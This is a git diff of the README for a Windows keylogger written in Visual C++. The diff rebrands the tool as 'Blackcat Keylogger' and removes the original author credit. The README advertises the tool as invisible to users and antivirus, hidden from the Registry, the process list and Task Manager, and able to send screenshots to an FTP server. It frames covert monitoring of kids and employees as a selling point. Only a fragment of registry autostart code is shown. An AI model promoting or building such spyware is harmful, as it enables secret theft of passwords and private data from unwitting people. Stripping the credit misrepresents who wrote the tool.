@@ -12,11 +12,11 @@
     ███   ▀█▀   ██████████  ▀█████▀  █████▄▄██  ▀██████▀    ████████▀    ████████▀    ██████████   ███    ███ 
     ▀                                ▀                                                             ███    ███ 
 ```
-# Advance-System-Keylogger
+# Blackcat Keylogger
 
-Advance System Keylogger is 100% invisible keylogger not only for users, but also undetectable by antivirus software. Advance System keylogger Monitors all keystokes, Mouse clicks. It has a seperate process which continues capture system screenshot and send to ftp server in given time. 
+Blackcat Keylogger is 100% invisible keylogger not only for users, but also undetectable by antivirus software. Blackcat keylogger Monitors all keystokes, Mouse clicks. It has a seperate process which continues capture system screenshot and send to ftp server in given time. 
 
-Advance System Keylogger designed in visual C++ and it is run in the background in stealth mode(Hidden Window).
+Blackcat Keylogger designed in visual C++ and it is run in the background in stealth mode(Hidden Window).
 
 ```
 A Keylogger (short for keystroke logger) is software that tracks or logs the keys struck on your keyboard, 
@@ -25,7 +25,7 @@ This is usually done with malicious intent to collect your account information, 
 user names, passwords, and other private data.
 ```
 
-### FEATURES OF ADVANCE KEYLOGGER
+### FEATURES OF Blackcat KEYLOGGER
 
 - Discrete/Tamper Proof :By design, Advance Keylogger is undetectable and thus cannot be tampered with or removed by kids/employees (who are often tech savvy). It does not appear in the Registry, the Process List, the System Tray, the Task Manager, on the Desktop, or in the Add/Remove programs.
 
@@ -257,10 +257,6 @@ void AutoStart()
 	RegCloseKey(hKey);
 }
 ```
-
-## Authors
-
-Ajay Randhawa
 
 ## Donate
 If you appreciate that, please consider donating to the Developer.
